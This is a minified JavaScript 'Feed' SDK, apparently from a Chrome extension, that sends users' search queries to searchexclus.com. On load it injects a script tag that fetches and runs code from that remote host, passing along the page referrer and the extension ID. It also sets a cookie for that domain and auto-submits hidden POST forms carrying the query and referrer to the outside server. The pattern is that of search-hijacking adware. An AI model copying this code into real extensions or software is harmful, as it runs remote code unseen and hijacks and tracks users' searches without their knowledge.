var Feed = function() {
	function l(a) {
		var c = 1E3,
			h, d = function(b) {
				var c = {
					a: a,
					referrer: document.referrer,
					type: Feed.type_,
					sdk_ver: f.SDK_VERSION
				};
				b = h;
				"undefined" !== typeof b && "" !== b && (c.q = b);
				"string" === typeof g && (c.id = g);
				b = [];
				for (e in c) c.hasOwnProperty(e) && b.push(encodeURIComponent(e) + "\x3d" + encodeURIComponent(c[e]));
				var e = b.join("\x26");
				b = f.BASE_URL + "?" + e;
				e = document.createElement("form");
				e.setAttribute("method", "POST");
				e.setAttribute("action", b);
				Feed._target_&&e.setAttribute("target", Feed._target_);
				for (var d in c) c.hasOwnProperty(d) && (b = document.createElement("input"),
					b.setAttribute("type", "hidden"), b.setAttribute("name", d), b.setAttribute("value", c[d]), e.appendChild(b));
				document.body.appendChild(e);
				e.submit()
			},
			k = function(b) {
				0 < c-- && !Feed.type_ ? setTimeout(k, 5) : d(b)
			};
		return {
			search: function(b,f) {
				h = b;
				Feed._target_=f
				"undefined" !== typeof Feed.type_ ? d(b) : k(b)
			},
			landingPage: function() {
				this.search()
			}
		}
	}
	var d, g, m = this,
		f = {
			BASE_URL: "https://searchexclus.com",
			HOME_URL: "https://searchexclus.com/home",
			SDK_VERSION: "1.1",
			CB: "Feed.setType"
		},
		n = function(a, c, d, f, g) {
			var b = new XMLHttpRequest;
			b.onreadystatechange =
				function() {
					4 === this.readyState && 200 === this.status ? "function" === typeof g && g(b.response) : "function" === typeof a && a(b)
				};
			b.open(d, c, !0);
			b.send()
		},
		p = function() {
			var a = document.createElement("script");
			a.src = f.HOME_URL + "?client_referral\x3d" + (document.referrer || "") + "\x26cb\x3d" + f.CB + "\x26sdk_ver\x3d" + f.SDK_VERSION + "\x26cbc\x3d" + (new Date).getTime();
			if ("object" === typeof chrome) try {
				g = chrome.runtime.id, a.src += "\x26id\x3d" + g
			} catch (c) {}
			document.getElementsByTagName("head")[0].appendChild(a)
		};
	(function() {
		if ("undefined" ===
			typeof m.type_) {
			var a = "undefined" === typeof chrome || "undefined" === typeof chrome.runtime || "undefined" === typeof chrome.runtime.getManifest ? !1 : chrome.runtime.getManifest;
			a ? (a = document.referrer || "", g = chrome.runtime.id, a = f.HOME_URL + "?client_referral\x3d" + a + "\x26sdk_ver\x3d" + f.SDK_VERSION, a += "\x26id\x3d" + g + "\x26cbc\x3d" + (new Date).getTime(), n(function(a) {}, a, "GET", "", function(a) {
				try {
					a = JSON.parse(a), Feed.type_ = a.type || "", chrome.cookies.set({
						url: f.BASE_URL,
						name: "sess",
						value: Feed.type_
					})
				} catch (h) {}
			})) : p()
		}
	})();
	return {
		setType: function(a) {
			"undefined" === typeof Feed.type_ && (Feed.type_ = a.type)
		},
		getInstance: function(a) {
			d || "object" === typeof a || (d = l(a));
			return d
		}
	}
}();